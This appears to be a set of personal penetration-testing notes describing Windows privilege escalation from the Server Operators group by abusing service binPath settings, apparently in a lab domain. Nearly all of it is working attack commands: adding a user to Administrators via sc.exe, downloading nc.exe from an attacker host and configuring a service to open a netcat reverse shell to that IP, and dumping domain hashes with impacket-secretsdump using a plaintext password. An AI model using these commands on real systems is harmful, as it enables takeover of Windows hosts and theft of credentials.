# Privilege Escalation: Server Operators to Administrator via Service Abuse (Creation)

---
## 1. Description
Members of the `Server Operators` group often have `SERVICE_CHANGE_CONFIG` permissions on specific system services. This allows an attacker to modify the `binPath` of a service to execute arbitrary commands as `NT AUTHORITY\SYSTEM`.

## 2. Attack Chain

### Step 1: Exploitation (Injection)

Create the target service configuration. We inject a command into the `binPath` that adds our user to the local `Administrators` group.

- **Target:** `AppReadiness`
    
- **Payload:** `net localgroup Administrators <user> /add`

```powershell
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators ahmed.emad /add"

```

> [!NOTE] Ensure there is a space after `binPath=` for the command to work.

### Step 2: Execution (Trigger Payload)

Start the service to execute the malicious command

```
sc.exe start AppReadiness
```
> [!WARNING] Expected Error You will receive **Error 1053** (The service did not respond... in a timely fashion). This is normal because the payload is not a valid service binary. The command executes _before_ the service crashes.

![[Pasted image 20260111144310.png]]
### Step 3: Verification
```
net user ahmed.emad
```
![[Pasted image 20260111144246.png]]
### Step 4: Post-Exploitation (Dumping Hashes)

```bash
impacket-secretsdump 'CONTROLLER.local/ahmed.emad:@Test12345'@10.81.131.50
```
![[Pasted image 20260111144123.png]]


# Privilege Escalation: Server Operators to Administrator via Service Abuse (Modification)

---
## 1. Description
Members of the `Server Operators` group often have `SERVICE_CHANGE_CONFIG` permissions on specific system services. This allows an attacker to modify the `binPath` of a service to execute arbitrary commands as `NT AUTHORITY\SYSTEM`.

## 2. Attack Chain
### Step 1 Enumeration

```
services
```

![[Pasted image 20260111151827.png]]
moving nc.exe from my machine to the target 
```
python -m http.server 8000
```
![[Pasted image 20260111152716.png]]
download it on the target
```powershell
 Invoke-WebRequest -Uri http://192.168.134.35:8000/nc.exe -OutFile C:\temp\nc.exe
```
![[Pasted image 20260111152658.png]]
### Step 2: Exploitation (Injection)

Modify the target service configuration. We inject a command into the `binPath` that reverse shell the target using nc.exe.

- **Target:** `AmazonSSMAgent`

```powershell
sc.exe config AmazonSSMAgent binPath= "C:\temp\nc.exe -e cmd.exe 192.168.134.35 1234"
```

> [!NOTE] Ensure there is a space after `binPath=` for the command to work.

### Step 2: Execution (Trigger Payload)

Start the service to execute the malicious command

```
 sc.exe start AmazonSSMAgent
```
> [!WARNING] Expected Error You will receive **Error 1053** (The service did not respond... in a timely fashion). This is normal because the payload is not a valid service binary. The command executes _before_ the service crashes.

![[Pasted image 20260111161514.png]]
### Step 3: Verification
```
whoami
```
![[Pasted image 20260111161411.png]]

### Step 4: Post-Exploitation (Dumping Hashes)

```bash
impacket-secretsdump 'CONTROLLER.local/ahmed.emad:@Test12345'@10.81.131.50
```
![[Pasted image 20260111144123.png]]
